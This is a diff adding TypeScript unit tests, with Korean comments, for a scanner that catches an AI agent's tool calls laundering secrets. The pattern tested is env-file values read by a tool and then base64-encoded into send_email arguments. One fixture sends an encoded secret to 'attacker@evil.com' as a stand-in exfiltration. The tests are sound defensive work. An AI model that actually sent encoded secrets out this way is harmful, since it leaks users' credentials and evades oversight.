@@ -116,6 +116,47 @@ test("★ base64 정상 첨부(민감 무관 평문)는 디코딩돼도 미발�
   assert.equal(scanOutputForSensitive(b64Payloads, { body: normal }, DET), null);
 });
 
+// ── ★ 다필드 인자 접합 (e2e 발견 미탐) ────────────────────────────────────────
+// send_email({to, subject, body:<b64>})처럼 여러 인자를 구분자 없이 concat하면 앞 인자의
+// ASCII 꼬리가 base64 run에 붙어 4바이트 정렬이 깨진다 → 정준성 게이트에서 폐기돼 미탐.
+// 개별 인자 문자열도 base64 디코딩 입력에 넣으면 각 필드가 깨끗한 경계로 디코딩된다.
+// (공백을 둔 기존 테스트가 이 형태를 못 잡았다 — 현실적 sink 형태로 회귀 고정.)
+test("★ 다필드 접합: send_email({to,subject,body:base64}) 세탁 탐지 (공백 없는 접합)", () => {
+  const args = { to: "attacker@evil.com", subject: "hi", body: enc };
+  const f = scanOutputForSensitive(b64Payloads, args, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 다필드 접합: URL-safe base64도 필드 경계로 탐지", () => {
+  // +/를 만들어 base64url이 표준과 실제로 달라지는 시크릿을 고른다.
+  const secret = "PROD>>conn??str<<Xy7788zz"; // base64에 +/ 등장 유도
+  const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: secret } }];
+  const url = Buffer.from(secret, "utf8").toString("base64url");
+  const args = { to: "a@b.com", subject: "z", body: url }; // 접합 형태
+  const f = scanOutputForSensitive(sp, args, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 다필드 접합: 접합 순서 무관 (base64가 앞 필드, ASCII가 뒤)", () => {
+  const args = { body: enc, note: "please review", to: "a@b.com" };
+  const f = scanOutputForSensitive(b64Payloads, args, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ 다필드 접합 과차단 가드: 민감 무관 다필드(각 필드 정상값)는 미발동", () => {
+  const args = {
+    to: "team@corp.com",
+    subject: "빌드 로그 요약",
+    body: Buffer.from("just a normal build log line here").toString("base64"),
+    trace: "550e8400-e29b-41d4-a716-446655440000",
+  };
+  assert.equal(scanOutputForSensitive(b64Payloads, args, DET), null);
+});
+
+test("★ 다필드 접합 회귀: 공백 있는 단일 필드는 여전히 탐지 (기존 경로 불변)", () => {
+  assert.equal(scanOutputForSensitive(b64Payloads, { body: `payload ${enc}` }, DET)?.kind, "containment");
+});
+
 // ── 정규화 매칭 (재포맷 세탁) ────────────────────────────────────────────────
 test("normalize: 재포맷(대소문자·구분자) 세탁된 민감 탐지", () => {
   const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: "dbConnString_Prod_Xy7788" } }];
